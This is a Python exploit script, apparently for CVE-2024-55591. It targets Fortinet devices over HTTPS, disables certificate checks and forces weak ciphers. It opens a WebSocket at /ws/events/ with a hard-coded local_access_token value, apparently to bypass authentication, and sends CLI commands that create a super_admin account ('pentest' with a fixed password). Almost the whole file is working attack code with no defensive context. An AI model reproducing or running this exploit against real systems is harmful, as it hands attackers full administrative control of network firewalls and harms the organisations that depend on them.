#!/usr/bin/python3
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import requests
import ssl
import socket
import struct
import random
import base64
import hashlib
import time
import argparse
import json

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

HOST = "192.168.182.188"
PORT = 443
GUID = "258EAFA5-E914-47DA-95CA-C5AB0DC85B11"

CIPHERS = "ECDHE-RSA-AES256-SHA@SECLEVEL=0"
context = ssl.create_default_context()
context.minimum_version = ssl.TLSVersion.MINIMUM_SUPPORTED
context.set_ciphers(CIPHERS)
context.check_hostname = False
context.verify_mode = ssl.CERT_NONE

def create_ssl_socket():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((HOST, PORT))
    ssl_sock = context.wrap_socket(sock)
    return ssl_sock

def try_read_response(sock) -> bytes:
    def read_or_raise(n):
        read = sock.read(n)
        if not read:
            raise RuntimeError("Unable to read response headers")
        return read

    count = 0
    max_count = 10
    headers = sock.read(1)
    while not headers:
        count += 1
        time.sleep(0.1)
        if count == max_count:
            raise RuntimeError("Timeout reading response headers")
        headers = sock.read(1)

    while b"\r\n\r\n" not in headers:
        headers += read_or_raise(100)

    return headers

def upgrade_http_to_websocket_req(sock, path: str, websocket_key) -> bytes:
    request = (
        f"GET {path} HTTP/1.1\r\n"
        f"Host: {HOST}:{PORT}\r\n"
        f"Connection: keep-alive, Upgrade\r\n"
        f"Sec-WebSocket-Version: 13\r\n"
        f"Sec-WebSocket-Key: {websocket_key}\r\n"
        f"Upgrade: websocket\r\n"
        f"\r\n"
    )
    sock.sendall(request.encode())
    return try_read_response(sock)

def generate_websocket_key():
    return base64.b64encode(bytes(''.join([random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789') for _ in range(16)]), 'utf-8')).decode('utf-8')

def create_websocket():
    sk = create_ssl_socket()
    websocket_key = generate_websocket_key()
    response_header = upgrade_http_to_websocket_req(sk, "/ws/events/?local_access_token=a5a5a5a5a5a5adasda8sd8sd8ewerfgfg", websocket_key)

    if "HTTP/1.1 101 Switching Protocols" not in response_header.decode("utf-8"):
        raise Exception("WebSocket handshake failed!")

    accept_key = None
    for line in response_header.decode("utf-8").split('\r\n'):
        if line.startswith('Sec-WebSocket-Accept'):
            accept_key = line.split(':')[1].strip()
            break

    expected_accept_key = base64.b64encode(hashlib.sha1((websocket_key + GUID).encode('utf-8')).digest()).decode('utf-8')
    if accept_key != expected_accept_key:
        raise Exception("WebSocket handshake validation failed!")

    print("[+] WebSocket handshake successful!")
    return sk

def generate_masking_key():
    return bytes([random.randint(0, 255) for _ in range(4)])

def send_websocket_frame(sock, payload_data, opcode=0x1):
    payload_length = len(payload_data)
    first_byte = 0b10000000 | (opcode & 0x0F)
    second_byte = 0b10000000

    if payload_length <= 125:
        header = bytearray([first_byte, second_byte | (payload_length & 0x7F)])
        mask = generate_masking_key()
        header.extend(mask)
        masked_payload = bytes([payload_data[i] ^ mask[i % 4] for i in range(payload_length)])
        frame = header + masked_payload
    elif payload_length <= 65535:
        header = bytearray([first_byte, second_byte | 0x7E])
        header.extend(struct.pack(">H", payload_length))
        mask = generate_masking_key()
        header.extend(mask)
        masked_payload = bytes([payload_data[i] ^ mask[i % 4] for i in range(payload_length)])
        frame = header + masked_payload
    else:
        header = bytearray([first_byte, second_byte | 0x7F])
        header.extend(struct.pack(">Q", payload_length))
        mask = generate_masking_key()
        header.extend(mask)
        masked_payload = bytes([payload_data[i] ^ mask[i % 4] for i in range(payload_length)])
        frame = header + masked_payload

    sock.send(frame)

def send_fortinet_admin_creation(sock, username="pentest", password="P@ssw0rd123"):
    cmds = [
        'config system admin',
        f'edit {username}',
        f'set password {password}',
        'set accprofile super_admin',
        'next',
        'end'
    ]
    for cmd in cmds:
        payload = json.dumps({"type": "cli", "payload": cmd})
        send_websocket_frame(sock, payload.encode())
        print(f"[+] Sent command: {cmd}")
        time.sleep(0.5)

def main():
    global HOST, PORT
    parser = argparse.ArgumentParser(description='CVE-2024-55591 - Admin Creator')
    parser.add_argument('--target', '-t', type=str, required=True, help='Target IP')
    parser.add_argument('--port', '-p', type=int, default=443, help='Target Port')
    args = parser.parse_args()
    HOST = args.target
    PORT = args.port

    sk = create_websocket()
    send_fortinet_admin_creation(sk)

if __name__ == "__main__":
    main()
